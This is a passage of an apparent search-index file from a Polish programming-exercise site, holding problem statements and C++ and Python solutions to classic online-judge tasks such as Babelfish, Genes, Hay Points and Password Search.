scanf(\"%d\", &amp;caseCount);\n\n    for (int caseId = 1; caseId &lt;= caseCount; caseId++) {\n        scanf(\"%d %d\", &amp;mangoCount, &amp;maxEat);\n        mangos = vector&lt;int&gt;(mangoCount);\n        mangoSum = 0;\n        canEat = true;\n        for (int i = 0; i &lt; mangoCount; i++) {\n            scanf(\"%d\", &amp;mangos[i]);\n            mangoSum += mangos[i];\n        }\n\n        for(int i = 0; i &lt; mangoCount; i++) {\n            scanf(\"%d\", &amp;currentEat);\n            if (currentEat &lt; mangos[i]) {\n                canEat = false;\n            }\n        }\n\n        if (mangoSum &gt; maxEat) {\n            canEat = false;\n        }\n\n        if (canEat) {\n            printf(\"Case %d: Yes\\n\", caseId);\n        } else {\n            printf(\"Case %d: No\\n\", caseId);\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-1/ultimate-mango-challenge/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>case_count = int(input())\n\nfor case_id in range(1, case_count + 1):\n    mango_count, max_eat = map(int, input().split())\n    can_eat = True\n    mangos = list(map(int, input().split()))\n    mango_sum = sum(mangos)\n    mangos_eat = list(map(int, input().split()))\n\n    for current_mango, current_eat in zip(mangos, mangos_eat):\n        if current_eat &lt; current_mango:\n            can_eat = False\n\n    if mango_sum &gt; max_eat:\n        can_eat = False\n\n    if can_eat:\n        print(f\"Case {case_id}: Yes\")\n    else:\n        print(f\"Case {case_id}: No\")\n</code></pre>"},{"location":"algorithmic-exercises/level-2/","title":"Poziom 2","text":"<p>Przy niekt\u00f3rych zadaniach trzeba chwil\u0119 d\u0142u\u017cej pomy\u015ble\u0107. Efektywno\u015b\u0107 rozwi\u0105zania jest tutaj istotna, warto wi\u0119c d\u0105\u017cy\u0107 do jak najlepszej z\u0142o\u017cono\u015bci.</p>"},{"location":"algorithmic-exercises/level-2/board-game/","title":"Gra planszowa","text":"<p>Bajtek stworzy\u0142 now\u0105 gr\u0119 planszow\u0105. Gra ta sk\u0142ada si\u0119 z jednej planszy o \\(n\\) polach, ko\u015bci o \\(n\\) \u015bciankach z warto\u015bciami od \\(1\\) do \\(n\\), oraz jednego pionka. Plansza to \\(n\\) p\u00f3l u\u0142o\u017conych obok siebie, co tworzy jedn\u0105 d\u0142ug\u0105 lini\u0119. Na ka\u017cdym z p\u00f3l umieszczona jest liczba ca\u0142kowita, reprezentuj\u0105ca liczb\u0119 punkt\u00f3w przypisan\u0105 do danego pola. Pierwsze pole zawsze ma przypisan\u0105 warto\u015b\u0107 \\(0\\).</p> <p>Regu\u0142y gry s\u0105 proste. Gracz umieszcza sw\u00f3j pionek na pierwszym polu planszy i rzuca ko\u015bci\u0105. Potem przesuwa pionek o liczb\u0119 p\u00f3l odpowiadaj\u0105c\u0105 liczbie oczek na ko\u015bci. Ten ruch powtarza si\u0119 wielokrotnie, za ka\u017cdym razem przesuwaj\u0105c pionek o tyle samo p\u00f3l, a\u017c pionek przekroczy kraw\u0119d\u017a planszy. Punkty z p\u00f3l, przez kt\u00f3re przechodzi\u0142 pionek, s\u0105 sumowane i stanowi\u0105 wynik gracza.</p> <p>Na przyk\u0142ad, je\u015bli mamy plansz\u0119 o d\u0142ugo\u015bci \\(5\\) z warto\u015bciami \\([0, 6, -1, 2, 4]\\), a rzut ko\u015bci\u0105 wskaza\u0142 liczb\u0119 \\(2\\), pionek odwiedzi trzy pola: pierwsze, trzecie oraz pi\u0105te (nast\u0119pny ruch wyjdzie ju\u017c poza plansz\u0119). Warto\u015bci tych p\u00f3l to odpowiednio: \\(0\\), \\(-1\\) oraz \\(4\\), co daje \u0142\u0105cznie \\(0+(-1)+4=3\\) punkty.</p> <p>Bajtek jest do\u015bwiadczonym graczem i potrafi rzuci\u0107 ko\u015bci\u0105 tak, aby wypad\u0142a dowolna, wybrana przez niego liczba. Jednak nie wie, jak\u0105 liczb\u0119 powinien wylosowa\u0107, aby osi\u0105gn\u0105\u0107 maksymalny wynik dla danej planszy, dlatego zwraca si\u0119 o pomoc do Ciebie!</p>"},{"location":"algorithmic-exercises/level-2/board-game/#dane","title":"Dane","text":"<p>Wej\u015bcie zawiera liczb\u0119 \\(n\\) (\\(1\\lq n\\lq 10^6\\)), kt\u00f3ra oznacz d\u0142ugo\u015b\u0107 planszy. Nast\u0119pnie podanych jest \\(n\\) liczb ca\u0142kowitych z przedzia\u0142u \\(&lt;-1000, 1000&gt;\\), ka\u017cda w oddzielnej linii.</p>"},{"location":"algorithmic-exercises/level-2/board-game/#wynik","title":"Wynik","text":"<p>Na wyj\u015bciu powinny pojawi\u0107 si\u0119 dwie liczby ca\u0142kowite: maksymalna mo\u017cliwa do uzyskania liczba punkt\u00f3w oraz liczba oczek na ko\u015bci (z zakresu od \\(1\\) do \\(n\\)), kt\u00f3ra jest potrzebna do osi\u0105gni\u0119cia tego wyniku. Je\u017celi mo\u017cna uzyska\u0107 maksymalny wynik na kilka sposob\u00f3w, wypisz dowolny z nich.</p>"},{"location":"algorithmic-exercises/level-2/board-game/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-2/board-game/#dane_1","title":"Dane","text":"<pre><code>5\n0\n6\n-1\n2\n4\n</code></pre>"},{"location":"algorithmic-exercises/level-2/board-game/#wynik_1","title":"Wynik","text":"<pre><code>12\n1\n</code></pre>"},{"location":"algorithmic-exercises/level-2/combination-lock/","title":"K\u0142\u00f3dka","text":"<p>Czas zaj\u0105\u0107 si\u0119 projektowaniem Escape Roomu, a k\u0142\u00f3dki szyfrowe czekaj\u0105 na swoj\u0105 kolej. W swoim magazynie posiadasz k\u0142\u00f3dki z okr\u0105g\u0142\u0105 tarcz\u0105, takie jak na zdj\u0119ciu poni\u017cej. Tarcza k\u0142\u00f3dki sk\u0142ada si\u0119 z \\(40\\) przedzia\u0142ek, kt\u00f3re s\u0105 numerowane od \\(0\\) do \\(39\\). Kombinacja do k\u0142\u00f3dki sk\u0142ada si\u0119 z trzech liczb z tego zakresu.</p> <p></p> <p>Aby otworzy\u0107 k\u0142\u00f3dk\u0119, nale\u017cy post\u0119powa\u0107 zgodnie z poni\u017cszym schematem:</p> <ul> <li>Obr\u00f3\u0107 tarcz\u0119 dwa razy w pe\u0142nym obwodzie zgodnie z ruchem wskaz\u00f3wek zegara.</li> <li>Kontynuuj\u0105c ruch, zatrzymaj si\u0119 na pierwszej liczbie z kombinacji.</li> <li>Wykonaj pe\u0142ny obr\u00f3t tarczy przeciwnie do ruchu wskaz\u00f3wek zegara.</li> <li>Kontynuuj\u0105c ruch, zatrzymaj si\u0119 na drugiej liczbie z kombinacji.</li> <li>Nast\u0119pnie obr\u00f3\u0107 tarcz\u0119 zgodnie z ruchem wskaz\u00f3wek zegara, zatrzymuj\u0105c si\u0119 na trzeciej liczbie z kombinacji.</li> <li>Teraz mo\u017cesz poci\u0105gn\u0105\u0107 za zamek i otworzy\u0107 k\u0142\u00f3dk\u0119.</li> </ul> <p>Twoim zadaniem jest wyliczenie, o ile stopni musisz \u0142\u0105cznie obr\u00f3ci\u0107 tarcz\u0119, aby otworzy\u0107 k\u0142\u00f3dk\u0119. Te informacje przydadz\u0105 si\u0119 przy tworzeniu jednej z zagadek w Escape Roomie!</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/105/10550.pdf</p>"},{"location":"algorithmic-exercises/level-2/combination-lock/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-2/combination-lock/#dane","title":"Dane","text":"<ul> <li>\\(p\\) - liczba naturalna, pocz\u0105tkowe ustawienie tarczy, \\(0\\leq p\\leq 39\\).</li> <li>\\(c1\\) - liczba naturalna, pierwsza liczba kombinacji, \\(0\\leq c1\\leq 39\\).</li> <li>\\(c2\\) - liczba naturalna, druga liczba kombinacji, \\(0\\leq c2\\leq 39\\).</li> <li>\\(c3\\) - liczba naturalna, trzecia liczba kombinacji, \\(0\\leq c3\\leq 39\\).</li> </ul>"},{"location":"algorithmic-exercises/level-2/combination-lock/#wynik","title":"Wynik","text":"<ul> <li>Liczba naturalna oznaczaj\u0105ca \u0142\u0105czn\u0105 liczb\u0119 stopni, o kt\u00f3re nale\u017cy obr\u00f3ci\u0107 tarcz\u0119, by otworzy\u0107 k\u0142\u00f3dk\u0119.</li> </ul>"},{"location":"algorithmic-exercises/level-2/combination-lock/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-2/combination-lock/#dane_1","title":"Dane","text":"<pre><code>0 30 0 30\n</code></pre> <p>Wynik: \\(1350\\)</p>"},{"location":"algorithmic-exercises/level-2/combination-lock/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-2/combination-lock/#dane_2","title":"Dane","text":"<pre><code>5 35 5 35\n</code></pre> <p>Wynik: \\(1350\\)</p>"},{"location":"algorithmic-exercises/level-2/combination-lock/#przykad-3","title":"Przyk\u0142ad 3","text":""},{"location":"algorithmic-exercises/level-2/combination-lock/#dane_3","title":"Dane","text":"<pre><code>0 20 0 20\n</code></pre> <p>Wynik: \\(1620\\)</p>"},{"location":"algorithmic-exercises/level-2/combination-lock/#przykad-4","title":"Przyk\u0142ad 4","text":""},{"location":"algorithmic-exercises/level-2/combination-lock/#dane_4","title":"Dane","text":"<pre><code>7 27 7 27\n</code></pre> <p>Wynik: \\(1620\\)</p>"},{"location":"algorithmic-exercises/level-2/combination-lock/#przykad-5","title":"Przyk\u0142ad 5","text":""},{"location":"algorithmic-exercises/level-2/combination-lock/#dane_5","title":"Dane","text":"<pre><code>0 10 0 10\n</code></pre> <p>Wynik: \\(1890\\)</p>"},{"location":"algorithmic-exercises/level-2/combination-lock/#przykad-6","title":"Przyk\u0142ad 6","text":""},{"location":"algorithmic-exercises/level-2/combination-lock/#dane_6","title":"Dane","text":"<pre><code>9 19 9 19\n</code></pre> <p>Wynik: \\(1890\\)</p>"},{"location":"algorithmic-exercises/level-2/number-game/","title":"Gra w liczby","text":"<p>Wyobra\u017a sobie prost\u0105 gr\u0119 dla dzieci: masz kilka liczb, zapisanych na osobnych kartach, a twoim zadaniem jest u\u0142o\u017cenie tych kart obok siebie tak, aby utworzy\u0142y jak najwi\u0119ksz\u0105 mo\u017cliw\u0105 liczb\u0119.</p> <p>We\u017amy na przyk\u0142ad trzy liczby: \\(90\\), \\(101\\) oraz \\(3\\). Istnieje wiele sposob\u00f3w na ich po\u0142\u0105czenie, co prowadzi do utworzenia nowych liczb: \\(901013\\), \\(903101\\), \\(101903\\), \\(101390\\), \\(310190\\) oraz \\(390101\\). Jak mo\u017cemy zauwa\u017cy\u0107, mamy tu do dyspozycji \\(6\\) kombinacji. Najwi\u0119ksza liczba, kt\u00f3r\u0105 mo\u017cemy w ten spos\u00f3b uzyska\u0107 to \\(903101\\). Twoim celem jest znalezienie takiej najwi\u0119kszej liczby i wygranie gry!</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/109/10905.pdf</p>"},{"location":"algorithmic-exercises/level-2/number-game/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-2/number-game/#wejscie","title":"Wej\u015bcie","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1, a_2, ..., a_n\\) - \\(n\\) liczb naturalnych</li> </ul>"},{"location":"algorithmic-exercises/level-2/number-game/#wyjscie","title":"Wyj\u015bcie","text":"<ul> <li>Najwi\u0119ksza liczba jaka mo\u017ce zosta\u0107 utworzona poprzez po\u0142\u0105czenie ze sob\u0105 liczb \\(a_1, a_2, ..., a_n\\) w wybranym porz\u0105dku.</li> </ul>"},{"location":"algorithmic-exercises/level-2/number-game/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-2/number-game/#wejscie_1","title":"Wej\u015bcie","text":"<pre><code>4\n123 124 56 90\n</code></pre>"},{"location":"algorithmic-exercises/level-2/number-game/#wyjscie_1","title":"Wyj\u015bcie","text":"<pre><code>9056124123\n</code></pre>"},{"location":"algorithmic-exercises/level-2/number-game/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-2/number-game/#wejscie_2","title":"Wej\u015bcie","text":"<pre><code>5\n123 124 56 90 9 \n</code></pre>"},{"location":"algorithmic-exercises/level-2/number-game/#wyjscie_2","title":"Wyj\u015bcie","text":"<pre><code>99056124123\n</code></pre>"},{"location":"algorithmic-exercises/level-2/snail/","title":"\u015alimak","text":"<p>\u015alimak znajduje si\u0119 na dnie studni o wysoko\u015bci 6 cm. W ci\u0105gu dnia \u015blimak jest w stanie wspi\u0105\u0107 si\u0119 o 3cm, jednak noc\u0105, podczas snu, zsuwa si\u0119 o 1cm w d\u00f3\u0142. Niestety, \u015blimak si\u0119 m\u0119czy - jego poziom zm\u0119czenia wynosi \\(10\\%\\) dziennie, co oznacza, \u017ce ka\u017cdego dnia jest w stanie wspi\u0105\u0107 si\u0119 o \\(10\\%*3=0.3\\) cm mniej ni\u017c poprzedniego dnia. Co wa\u017cne, ka\u017cdego dnia odejmujemy sta\u0142\u0105 warto\u015b\u0107, czyli \\(10\\%\\) wysoko\u015bci wspinaczki z pierwszego dnia.</p> <p>Twoim zadaniem jest okre\u015blenie, kt\u00f3ra doba b\u0119dzie t\u0105, podczas kt\u00f3rej \u015blimak wydostanie si\u0119 ze studni, to znaczy kiedy wysoko\u015b\u0107, na kt\u00f3rej si\u0119 znajduje po wspinaczce, b\u0119dzie wi\u0119ksza ni\u017c wysoko\u015b\u0107 studni. Przyk\u0142adowy przebieg sytuacji prezentuje poni\u017csza tabela:</p> Doba Pocz\u0105tkowa wysoko\u015b\u0107 D\u0142ugo\u015b\u0107 wspinaczki Wysoko\u015b\u0107 po wspinaczce Wysoko\u015b\u0107 po zsuni\u0119ciu 1 0 3 3 2 2 2 2.7 4.7 3.7 3 3.7 2.4 6.1 --- <p>Jak wida\u0107, w naszym przypadku \u015blimak wydostaje si\u0119 na powierzchni\u0119 w trakcie trzeciej doby.</p> <p>W zale\u017cno\u015bci od parametr\u00f3w, \u015blimak mo\u017ce albo wydosta\u0107 si\u0119 ze studni, albo opa\u015b\u0107 na jej dno. Twoim zadaniem jest okre\u015blenie, kt\u00f3ra z tych sytuacji ma miejsce, oraz podanie doby, podczas kt\u00f3rej to nast\u0119puje.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/5/573.pdf</p>"},{"location":"algorithmic-exercises/level-2/snail/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-2/snail/#dane","title":"Dane","text":"<ul> <li>\\(H\\) - liczba naturalna, wysoko\u015b\u0107 studni, \\(1\\leq H\\leq 100\\).</li> <li>\\(U\\) - liczba naturalna, wysoko\u015b\u0107, na kt\u00f3r\u0105 pocz\u0105tkowo wspina si\u0119 \u015blimak w trakcie dnia, \\(1\\leq U\\leq 100\\).</li> <li>\\(D\\) - liczba naturalna, odleg\u0142o\u015b\u0107, kt\u00f3r\u0105 \u015blimak pokonuje zsuwaj\u0105c si\u0119 w nocy, \\(1\\leq D\\leq 100\\).</li> <li>\\(F\\) - liczba naturalna, stopie\u0144 zm\u0119czenia wyra\u017cony w procentach, \\(1\\leq F\\leq 100\\).</li> </ul> <p>Uwaga: \u015blimak nigdy nie wspina si\u0119 o warto\u015b\u0107 ujemn\u0105 w trakcie dnia. Mo\u017ce co najwy\u017cej zm\u0119czy\u0107 si\u0119 tak bardzo, \u017ce nie b\u0119dzie si\u0119 ju\u017c w og\u00f3le wspina\u0142, tylko zsuwa\u0142 w nocy.</p>"},{"location":"algorithmic-exercises/level-2/snail/#wynik","title":"Wynik","text":"<ul> <li>Komunikat \"Ucieczka\" je\u017celi \u015blimak wyszed\u0142 ze studni, lub \"Dno\", je\u017celi \u015blimak opad\u0142 na dno, oraz numer doby, w kt\u00f3rej nast\u0105pi\u0142a dana sytuacja.</li> </ul>"},{"location":"algorithmic-exercises/level-2/snail/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-2/snail/#dane_1","title":"Dane","text":"<pre><code>6 3 1 10\n</code></pre> <p>Wynik: Ucieczka 3</p>"},{"location":"algorithmic-exercises/level-2/snail/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-2/snail/#dane_2","title":"Dane","text":"<pre><code>10 2 1 50\n</code></pre> <p>Wynik: Dno 4</p>"},{"location":"algorithmic-exercises/level-2/snail/#przykad-3","title":"Przyk\u0142ad 3","text":""},{"location":"algorithmic-exercises/level-2/snail/#dane_3","title":"Dane","text":"<pre><code>50 5 3 14\n</code></pre> <p>Wynik: Dno 7</p>"},{"location":"algorithmic-exercises/level-2/snail/#przykad-4","title":"Przyk\u0142ad 4","text":""},{"location":"algorithmic-exercises/level-2/snail/#dane_4","title":"Dane","text":"<pre><code>50 6 4 1\n</code></pre> <p>Wynik: Dno 68</p>"},{"location":"algorithmic-exercises/level-2/snail/#przykad-5","title":"Przyk\u0142ad 5","text":""},{"location":"algorithmic-exercises/level-2/snail/#dane_5","title":"Dane","text":"<pre><code>50 6 3 1\n</code></pre> <p>Wynik: Ucieczka 20</p>"},{"location":"algorithmic-exercises/level-2/snail/#przykad-6","title":"Przyk\u0142ad 6","text":""},{"location":"algorithmic-exercises/level-2/snail/#dane_6","title":"Dane","text":"<pre><code>1 1 1 1\n</code></pre> <p>Wynik: Dno 2</p>"},{"location":"algorithmic-exercises/level-3/","title":"Poziom 3","text":"<p>Zadania dla wprawionych w boju programist\u00f3w.</p>"},{"location":"algorithmic-exercises/level-3/andy-first-dictionary/","title":"Andy's First Dictionary","text":"<p>Andy's First Dictionary</p>"},{"location":"algorithmic-exercises/level-3/andy-first-dictionary/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/andy-first-dictionary/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/andy-first-dictionary/#zestaw-2","title":"Zestaw 2","text":"<p> dane2.txt</p> <p> wynik2.txt</p>"},{"location":"algorithmic-exercises/level-3/andy-first-dictionary/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;set&gt;\n\nusing namespace std;\n\nvoid toWords(string &amp;text, set&lt;string&gt; &amp;words)\n{\n    int i = 0;\n    string b = \"\";\n\n    while (text.length() &gt; 0)\n    {\n        if (!isalpha(text[0]) &amp;&amp; b.length() &gt; 0)\n        {\n            words.insert(b);\n            b = \"\";\n        }\n        else if (isalpha(text[0]))\n        {\n            b += tolower(text[0]);\n        }\n\n        text.erase(0, 1);\n    }\n\n    if (b.length() &gt; 0)\n    {\n        words.insert(b);\n    }\n}\n\nint main()\n{\n    string text;\n    set&lt;string&gt; words;\n    while (cin &gt;&gt; text &amp;&amp; !cin.eof())\n    {\n        toWords(text, words);\n    }\n\n    for (auto &amp;word : words)\n    {\n        cout &lt;&lt; word &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-3/babelfish/","title":"Babelfish","text":"<p>Babelfish</p>"},{"location":"algorithmic-exercises/level-3/babelfish/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/babelfish/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/babelfish/#zestaw-2","title":"Zestaw 2","text":"<p> dane2.txt</p> <p> wynik2.txt</p>"},{"location":"algorithmic-exercises/level-3/babelfish/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main()\n{\n    char c;\n    string translation, word;\n    map&lt;string, string&gt; dictionary;\n\n    while (scanf(\"%c\", &amp;c) &amp;&amp; c != '\\n')\n    {\n        ungetc(c, stdin);\n        cin &gt;&gt; translation &gt;&gt; word;\n        dictionary[word] = translation;\n        scanf(\"%c\", &amp;c);\n    }\n\n    while (cin &gt;&gt; word &amp;&amp; !cin.eof())\n    {\n        if (dictionary[word] == \"\") {\n            printf(\"eh\\n\");\n        }\n        else {\n            cout &lt;&lt; dictionary[word] &lt;&lt; endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-3/babelfish/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>dictionary = dict()\n\nwhile True:\n    line = input()\n    if len(line) &lt;= 1:\n        break\n\n    translation, word = line.split(\" \")\n    dictionary[word] = translation\n\nwhile True:\n    try:\n        word = input()\n    except EOFError:\n        break\n\n    if word not in dictionary:\n        print(\"eh\")\n    else:\n        print(dictionary[word])\n</code></pre>"},{"location":"algorithmic-exercises/level-3/genes/","title":"Genes","text":"<p>Genes</p>"},{"location":"algorithmic-exercises/level-3/genes/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/genes/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/genes/#zestaw-2","title":"Zestaw 2","text":"<p> dane2.txt</p> <p> wynik2.txt</p>"},{"location":"algorithmic-exercises/level-3/genes/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nstring combineGenes(string gene1, string gene2);\n\nvoid computeGene(string name, map&lt;string, string&gt; &amp;genes, map&lt;string, pair&lt;string, string&gt;&gt; &amp;parents);\n\nint main()\n{\n    int n;\n    string name, value;\n    map&lt;string, string&gt; genes;\n    map&lt;string, pair&lt;string, string&gt;&gt; parents;\n    scanf(\"%d\", &amp;n);\n\n    for (int i = 0; i &lt; n; ++i)\n    {\n        cin &gt;&gt; name &gt;&gt; value;\n        if (value == \"dominant\" || value == \"recessive\" || value == \"non-existent\")\n        {\n            genes[name] = value;\n        }\n        else\n        {\n            if (parents[value].first == \"\")\n            {\n                parents[value].first = name;\n            }\n            else\n            {\n                parents[value].second = name;\n            }\n        }\n    }\n\n    for (auto &amp;el : parents)\n    {\n        computeGene(el.first, genes, parents);\n    }\n\n    for (auto &amp;el : genes)\n    {\n        printf(\"%s %s\\n\", el.first.c_str(), el.second.c_str());\n    }\n\n    return 0;\n}\n\nstring combineGenes(string gene1, string gene2)\n{\n    if ((gene1 == \"non-existent\" &amp;&amp; gene2 != \"dominant\") || (gene1 != \"dominant\" &amp;&amp; gene2 == \"non-existent\"))\n    {\n        return \"non-existent\";\n    }\n\n    if ((gene1 == \"dominant\" &amp;&amp; gene2 != \"non-existent\") || (gene1 != \"non-existent\" &amp;&amp; gene2 == \"dominant\"))\n    {\n        return \"dominant\";\n    }\n\n    return \"recessive\";\n}\n\nvoid computeGene(string name, map&lt;string, string&gt; &amp;genes, map&lt;string, pair&lt;string, string&gt;&gt; &amp;parents)\n{\n    if (genes[name] != \"\")\n    {\n        return;\n    }\n\n    computeGene(parents[name].first, genes, parents);\n    computeGene(parents[name].second, genes, parents);\n    genes[name] = combineGenes(genes[parents[name].first], genes[parents[name].second]);\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-3/genes/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>def combine_genes(gene1: str, gene2: str) -&gt; str:\n    if (gene1 == \"non-existent\" and gene2 != \"dominant\") or (\n        gene1 != \"dominant\" and gene2 == \"non-existent\"\n    ):\n        return \"non-existent\"\n\n    if (gene1 == \"dominant\" and gene2 != \"non-existent\") or (\n        gene1 != \"non-existent\" and gene2 == \"dominant\"\n    ):\n        return \"dominant\"\n\n    return \"recessive\"\n\ndef compute_gene(name: str, genes: dict, parents: dict):\n    if name in genes:\n        return\n\n    compute_gene(parents[name][0], genes, parents)\n    compute_gene(parents[name][1], genes, parents)\n    genes[name] = combine_genes(genes[parents[name][0]], genes[parents[name][1]])\n\ngenes = dict()\nparents = dict()\nn = int(input())\n\nfor _ in range(n):\n    name, value = input().split()\n\n    if value in [\"dominant\", \"recessive\", \"non-existent\"]:\n        genes[name] = value\n    else:\n        if value not in parents:\n            parents[value] = [name, \"\"]\n        else:\n            parents[value][1] = name\n\nfor el in parents:\n    compute_gene(el, genes, parents)\n\nfor el in sorted(genes):\n    print(el, genes[el])\n</code></pre>"},{"location":"algorithmic-exercises/level-3/hay-points/","title":"Hay Points","text":"<p>Hay Points</p>"},{"location":"algorithmic-exercises/level-3/hay-points/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/hay-points/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/hay-points/#zestaw-2","title":"Zestaw 2","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/hay-points/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main()\n{\n    int m, n;\n    unsigned long long s;\n    string str;\n    map&lt;string, unsigned long long&gt; values;\n\n    scanf(\"%d %d\", &amp;m, &amp;n);\n\n    for (int i = 0; i &lt; m; ++i)\n    {\n        cin &gt;&gt; str;\n        scanf(\"%llu\", &amp;values[str]);\n    }\n\n    for (int i = 0; i &lt; n; ++i)\n    {\n        s = 0;\n        while ((cin &gt;&gt; str) &amp;&amp; str != \".\")\n        {\n            s += values[str];\n        }\n\n        printf(\"%llu\\n\", s);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-3/hay-points/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>values = dict()\n\nm, n = map(int, input().split(\" \"))\n\nfor _ in range(m):\n    word, val = input().split(\" \")\n    values[word] = int(val)\n\nfor _ in range(n):\n    result = 0\n    while True:\n        text = input()\n        if text == \".\":\n            break\n\n        for word in text.split(\" \"):\n            if word in values:\n                result += values[word]\n\n    print(result)\n</code></pre>"},{"location":"algorithmic-exercises/level-3/list-of-conquests/","title":"List of Conquests","text":"<p>List of Conquests</p>"},{"location":"algorithmic-exercises/level-3/list-of-conquests/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/list-of-conquests/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/list-of-conquests/#zestaw-2","title":"Zestaw 2","text":"<p> dane2.txt</p> <p> wynik2.txt</p>"},{"location":"algorithmic-exercises/level-3/list-of-conquests/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;set&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main()\n{\n    int n;\n    string country;\n    map&lt;string, int&gt; counters;\n\n    scanf(\"%d\", &amp;n);\n\n    for (int i = 0; i &lt; n; ++i)\n    {\n        cin &gt;&gt; country;\n        counters[country]++;\n        getline(cin, country);\n    }\n\n    for (auto &amp;el : counters)\n    {\n        printf(\"%s %d\\n\", el.first.c_str(), el.second);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-3/list-of-conquests/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>counters = dict()\nn = int(input())\n\nfor _ in range(n):\n    country = input().split(\" \")[0]\n\n    if country in counters:\n        counters[country] += 1\n    else:\n        counters[country] = 1\n\nfor country in sorted(counters):\n    print(f\"{country} {counters[country]}\")\n</code></pre>"},{"location":"algorithmic-exercises/level-3/password-search/","title":"Password Search","text":"<p>Password Search</p>"},{"location":"algorithmic-exercises/level-3/password-search/#pliki-z-danymi","title":"Pliki z danymi","text":""},{"location":"algorithmic-exercises/level-3/password-search/#zestaw-1","title":"Zestaw 1","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/password-search/#zestaw-2","title":"Zestaw 2","text":"<p> dane1.txt</p> <p> wynik1.txt</p>"},{"location":"algorithmic-exercises/level-3/password-search/c%2B%2B/","title":"C++ - rozwi\u0105zanie","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nint main()\n{\n    int passwordSize, maxCounter, currentCounter;\n    unsigned long long hash, powerOf26;\n    string encodedMsg, currentStr, password;\n    map&lt;unsigned long long, int&gt; counters;\n\n    while (scanf(\"%d\", &amp;passwordSize) != EOF)\n    {\n        cin &gt;&gt; encodedMsg;\n\n        counters.clear();\n        currentStr = encodedMsg.substr(0, passwordSize);\n        hash = 0;\n        powerOf26 = 1;\n\n        for (int i = 0; i &lt; passwordSize; ++i)\n        {\n            hash += (currentStr[i] - 'a' + 1) * powerOf26;\n            powerOf26 *= 26;\n        }\n\n        powerOf26 /= 26;\n\n        currentCounter = ++counters[hash];\n        maxCounter = currentCounter;\n        password = currentStr;\n\n        for (int i = 1; i &lt; encodedMsg.length() - passwordSize; ++i)\n        {\n            hash -= (currentStr[0] - 'a' + 1);\n            currentStr.erase(0, 1);\n            currentStr += encodedMsg[i + passwordSize - 1];\n            hash /= 26;\n            hash += (currentStr[passwordSize - 1] - 'a' + 1) * powerOf26;\n            currentCounter = ++counters[hash];\n            if (currentCounter &gt; maxCounter)\n            {\n                maxCounter = currentCounter;\n                password = currentStr;\n            }\n        }\n\n        printf(\"%s\\n\", password.c_str());\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-3/password-search/python/","title":"Python - rozwi\u0105zanie","text":"<pre><code>while 